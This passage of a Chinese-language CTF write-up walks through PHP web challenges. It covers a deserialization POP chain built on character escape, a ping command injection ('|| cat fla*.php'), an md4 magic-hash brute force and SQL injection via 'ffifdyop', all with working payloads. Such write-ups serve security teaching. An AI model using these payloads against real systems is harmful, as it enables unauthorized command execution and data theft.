is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</div><div class="line">print_r($player);</div><div class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $user;</div><div class="line">    <span class="keyword">protected</span> $pass;</div><div class="line">    <span class="keyword">protected</span> $admin;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;user = $user;</div><div class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</div><div class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</div><div class="line">            $name = <span class="keyword">$this</span>-&gt;name;</div><div class="line">            $name();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;TP();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;Gank();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"cat /flag"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;KS();  </div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>主要代码及功能：<br>index.php接收传入的<code>$_GET[&#39;username&#39;]</code>和<code>$_GET[&#39;password&#39;]</code>变量，创建player对象，经过serialize序列化后写入<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件</p><p>play.php读取<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件内容，将文件中序列化字符串进行反序列化，打印</p><p>class.php当中定义了一些类，并存在可利用的反序列化pop链</p><p>common.php主要对序列化和反序列化的数据流进行一些检查和处理</p><p>正常情况下，写入文件的序列化内容是不可控的，但是这里由于common.php当中的read函数会在字符串反序列化之前将序列化字符串当中的<code>\0*\0</code>替换为<code>chr(0).&quot;*&quot;.chr(0)</code>，从5个字符变成了3个字符，导致处理后的字符串在反序列化时，字符串属性值长度大于实际的长度，产生字符逃逸，导致之后的序列化字符串内容可控</p><p>字符逃逸测试，尝试将player的<code>$admin</code>属性值变成1，该值本来是不可控的，这里尝试通过字符逃逸将其变为可控</p><p><img src="http://pic.c1imber.top/blog/20200824/yvHWtwz0yeOG.png?imageslim" alt="mark"></p><p>传入：</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}</code></pre><p>可以看到$admin的值被改变为了1，输出FPX Champion</p><p><img src="http://pic.c1imber.top/blog/20200824/xtRsQDnVI4lz.png?imageslim" alt="mark"></p><p>文件当中的序列化字符串：</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;\0*\0user&quot;;s:55:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&quot;;s:7:&quot;\0*\0pass&quot;;s:50:&quot;&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre><p>经过read函数处理后（为了方便表示，这里protected属性名中的不可见字符用0表示）</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}&quot;;s:8:&quot;0*0admin&quot;;i:0;}</code></pre><p><code>\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</code></p><p>由长度55变为了</p><p><code>0*00*00*00*00*00*00*00*00*00*00*0长度33</code></p><p><code>&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;</code>为逃逸的字符，长度为55-33，22</p><p>逃逸的字符之后的序列化字符串就变为可控内容了，可以通过$_GET[‘password’]构造可控的序列化字符串</p><p>php序列化字符串遇到}后完成反序列化，实际反序列化字符串为</p><pre><code>O:6:&quot;player&quot;:3：{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}object(__PHP_Incomplete_Class)#1 (4) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(6) &quot;player&quot; [&quot;user&quot;:protected]=&gt; string(55) &quot;***********&quot;;s:7:&quot;*pass&quot;;s:50:&quot;&quot; [&quot;pass&quot;:protected]=&gt; string(3) &quot;111&quot; [&quot;admin&quot;:protected]=&gt; int(1) }</code></pre><p>根据class.php构造pop链</p><p>最终需要触发的地方为jungle对象的KS方法当中的<code>system(&#39;cat /flag&#39;)</code>-&gt;</p><p>jungle对象的<code>__toString</code>魔术方法刚好调用了KS方法-&gt;</p><p><code>__toString</code>魔术方法在对象被当作字符串时触发，所以需要找到一个jungle对象有可能被当作字符串的位置-&gt;</p><p>在midsolo对象的Gank方法当中，使用了stristr字符串函数，如果将这里midsolo对象的$name属性设置为jungle对象，就可以触发jungle的<code>__toString</code>-&gt;</p><p>midsolo对象的<code>__invoke</code>魔术方法刚好调用了Gank方法，<code>__invoke</code>魔术方法在其对象被作为函数调用时触发-&gt;</p><p>很容易可以找到topsolo对象的TP方法，这里调用了<code>$name()</code>，如果将topsolo对象的$name属性设置为midsolo对象，就能触发midsolo的<code>__invoke</code>-&gt;</p><p>而刚好topsolo的<code>__destruct</code>调用了topsolo的TP方法，所以这里可以作为pop链的起点</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    </div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> topsolo();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><pre><code>O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>修改payload</p><p>1、存在不可见字符，修改成</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>2、midsolo的<code>__walkup</code>方法要求$name必须为Yasuo，所以需要绕过<code>__walkup</code>方法<br>改为：</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>3、common.php当中的check函数要求序列化字符串当中不能存在name</p><p>把n改为\6e</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>最终传入</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:8:&quot;\0*\0admin&quot;;i:1;S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/d8wxX2yFHQU2.png?imageslim" alt="mark"></p><p>访问play.php获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/5HLVOwJA1qKC.png?imageslim" alt="mark"></p><h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>preg_match检查<code>$_GET[&quot;ip&quot;]</code>当中不能有flag字符串，直接用linux通配符就能绕过</p><p><code>http://xxx/?ip=1.1.1.1%20||%20cat%20fla*.php</code></p><p><img src="http://pic.c1imber.top/blog/20200824/piMpGWj02C6D.png?imageslim" alt="mark"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"><span class="comment">//level 1</span></div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 2</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//level 3</span></div><div class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</div><div class="line">$result = $mysqli-&gt;query($query);</div><div class="line">$row = $result-&gt;fetch_assoc(); </div><div class="line">var_dump($row);</div><div class="line">$result-&gt;free();</div><div class="line">$mysqli-&gt;close();</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>evel1这里本来想传入空数组去绕过的，因为hash函数参数为数组时会产生错误，导致hash运算结果为NULL，所以如果传入空数组的话两者就相等了，但是试了半天却发现不行</p><p>而下面的代码是可以的</p><p><img src="http://pic.c1imber.top/blog/20200824/Y6nYJ9knFi0M.png?imageslim" alt="mark"></p><p>于是在这里卡了好久，最后才发现问题出在了哪</p><p><strong>因为通过<code>$_GET</code>方式传入空数组和直接定义空数组是有区别的</strong></p><p>通过<code>$_GET</code>方式传入数组，数组里有个默认的元素，内容为空字符串，所以即使<code>_GET</code>传入了空数组，但是其实这里的<code>$_GET[&#39;hash1&#39;]</code>并不是真正的空数组，而是<code>array(1) { [0]=&gt; string(0) &quot;&quot; }</code>，所以这里两者并不相等</p><p>在本地<code>var_dump($_GET[&#39;hash1&#39;])</code>就知道了</p><p><img src="http://pic.c1imber.top/blog/20200824/i3GbyqKOzpvn.png?imageslim" alt="mark"></p><p>所以这里需要换一下思路</p><p>这里lelvel1要求<code>$_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;])</code></p><p>而php弱类型当中还有一个特性是<code>&quot;0e\d+&quot;==&quot;0e\d+&quot;</code>的结果是为true的，因为两个字符串都以0e开头且后面的字符均为数字，php在通过==比较时会将两个字符串都转为科学计数法,于是两个结果都是0，所以相等</p><p><img src="http://pic.c1imber.top/blog/20200824/rUX1XczPPl9R.png?imageslim" alt="mark"></p><p>那么这里需要找一个字符串，符合以下条件的：</p><p>1、字符串需要以0e开头，且之后的字符都是数字</p><p>2、该字符串md4后的结果也需要为0e开头，且后面均为数字</p><p>这样只能爆破了，脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</div><div class="line"> </div><div class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</div><div class="line">    <span class="keyword">if</span> (hash(<span class="string">"md4"</span>,<span class="string">"0e"</span>. $i) == $hash) &#123;</div><div class="line">        <span class="keyword">echo</span> $i;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"> </div><div class="line"><span class="keyword">echo</span> <span class="string">'  done'</span>;</div></pre></td></tr></table></figure><p>十几分钟就爆破成功了</p><p><img src="http://pic.c1imber.top/blog/20200824/JOYhnsKbeEF6.png?imageslim" alt="mark"></p><p>得到符合条件的字符串：0e251288019</p><p><img src="http://pic.c1imber.top/blog/20200824/3vFzMhWgpGGd.png?imageslim" alt="mark"></p><p>level2比较简单，<code>$_GET[&#39;hash2&#39;]</code>和<code>$_GET[&#39;hash3&#39;]</code>均为空数组即可绕过</p><p>level3接收参数拼接SQL语句，直接查询flag，语句如下</p><p><code>&quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;</code></p><p>需要 <code>md5($_GET[&quot;hash4&quot;],true)</code>可控，这里的true返回的是md5后的二进制数据</p><p>找到了一篇文章，文章中提到了一个神奇的字符串：<code>ffifdyop</code>，该字符串<code>md5(xxx,true)</code>后的结果为<code>&#39;&#39;or&#39;二进制数据&#39;</code>，导致可以注入查询所有内容</p><p>文章连接：<br><a href="https://blog.csdn.net/solitudi/article/details/107813286" target="_blank" rel="external">https://blog.csdn.net/solitudi/article/details/107813286</a></p><p><img src="http://pic.c1imber.top/blog/20200824/IzEUegw2OTKP.png?imageslim" alt="mark"></p><p>所以最终结果为：</p><p><code>http://xxx/index.php?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/jl0lvpPTepbq.png?imageslim" alt="mark"></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="half-infiltration（赛后做出）"><a href="#half-infiltration（赛后做出）" class="headerlink" title="half_infiltration（赛后做出）"></a>half_infiltration（赛后做出）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"></div><div class="line">$flag=file_get_contents(<span class="string">'ssrf.php'</span>);</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        ob_start();</div><div class="line">        <span class="keyword">global</span> $result;</div><div class="line">        <span class="keyword">print</span> $result;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $age,$sex,$num;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $student = <span class="keyword">$this</span>-&gt;age;</div><div class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</div><div class="line">        $a = <span class="keyword">$this</span>-&gt;num;</div><div class="line">    $student-&gt;$boy();</div><div class="line">    <span class="keyword">if</span>(!(is_string($a)) ||!(is_string($boy)) || !(is_object($student)))</div><div class="line">    &#123;</div><div class="line">        ob_end_clean();</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">global</span> $$a;</div><div class="line">    $result=$GLOBALS[<span class="string">'flag'</span>];</div><div class="line">        ob_end_clean();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</div><div class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</div><div 